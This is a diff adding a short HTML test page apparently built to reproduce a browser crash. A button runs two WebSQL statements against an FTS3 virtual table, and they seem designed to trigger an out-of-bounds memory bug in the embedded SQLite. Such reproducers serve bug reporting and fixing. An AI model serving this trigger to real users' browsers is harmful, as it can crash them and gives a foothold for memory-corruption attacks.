@@ -1,0 +1,37 @@
+<button onClick="crash()" style="font-size: 150%">Crash this page</button>
+
+
+<script>
+var DB_NAME = 'test_oob'
+
+const firstStatements = [
+"create VIRTUAL table var14 using fts3 ( var2 );",
+"WITH  var14 AS ( SELECT 1) UPDATE var14 SET var2 = NULL FROM 'var14' ;",
+];
+
+function dbSuccess() {
+	console.log("success");
+	console.log(arguments);
+}
+
+function dbErr() {
+	console.log("err");
+	console.log(arguments[1]);
+}
+
+function runAll(statements, success) {
+	db.transaction((tx) => {
+		for (const statement of statements) {
+			tx.executeSql(statement, [], dbSuccess, dbErr);
+		}
+	}, dbErr, success);
+}
+
+function crash() {
+  db = openDatabase(DB_NAME, 1, 'oob', 5000000);
+
+  runAll(firstStatements, (event) => {
+      console.log(event);
+  });
+}
+</script>
